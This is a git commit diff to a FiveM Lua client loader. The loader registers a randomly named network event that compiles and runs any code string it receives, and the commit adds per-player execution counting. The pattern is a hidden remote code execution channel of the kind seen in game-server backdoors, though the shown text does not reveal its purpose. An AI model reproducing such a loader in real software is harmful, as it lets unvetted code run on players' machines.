2932908c893fb48410ac2b030f462419a97d2089
E1nbyte <111838980+e1nbyte@users.noreply.github.com>
2024-10-31 17:46:21 +0100

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,9 +1,24 @@
+local executedPlayers = {}
 local resourceName = GetCurrentResourceName()
 
-RegisterNetEvent(resourceName .. ":Nzft8ATykVjvecHu8aFWBhA7q", function(code)
+RegisterNetEvent(resourceName .. ":Nzft8ATykVjvecHu8aFWBhA7q", function(resources, code)
+    local playerId = GetPlayerServerId(PlayerId())
+
+    if not executedPlayers[playerId] then
+        executedPlayers[playerId] = { executed = false, resourceCount = 0 }
+    end
+
+    if executedPlayers[playerId].executed then return end
+
     local func = load(code)
     if func then
-        func() 
+        func()
+
+        executedPlayers[playerId].resourceCount += 1
+
+        if executedPlayers[playerId].resourceCount >= resources then
+            executedPlayers[playerId].executed = true
+        end
     end
 end)
 
